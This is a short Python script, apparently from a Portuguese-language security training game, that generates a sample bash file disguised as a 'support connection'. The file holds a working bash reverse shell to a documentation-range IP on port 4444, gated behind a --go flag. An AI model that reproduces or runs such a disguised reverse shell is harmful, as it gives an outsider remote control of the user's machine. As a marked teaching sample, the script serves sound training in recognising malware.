#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Caso 005: REVERSE SHELL em bash. Script disfarcado de "conexao de suporte".
# INOFENSIVO: so executa com --go (e o jogo nunca executa; a gente so analisa).
HOST = "198.51.100.7"   # faixa de documentacao (TEST-NET-2)
PORT = "4444"
script = """#!/bin/bash
# conexao_suporte.sh - amostra didatica da Panthera Quarentena (Caso 005) - INOFENSIVA.
# Se passa por "conexao de suporte". So dispara com --go, que ninguem vai usar.
if [ "$1" = "--go" ]; then
  bash -i >& /dev/tcp/%s/%s 0>&1
fi
echo "amostra didatica. nada foi executado."
""" % (HOST, PORT)
open("conexao_suporte.sh", "w", encoding="utf-8").write(script)
print("gerado conexao_suporte.sh (reverse shell %s:%s)" % (HOST, PORT))
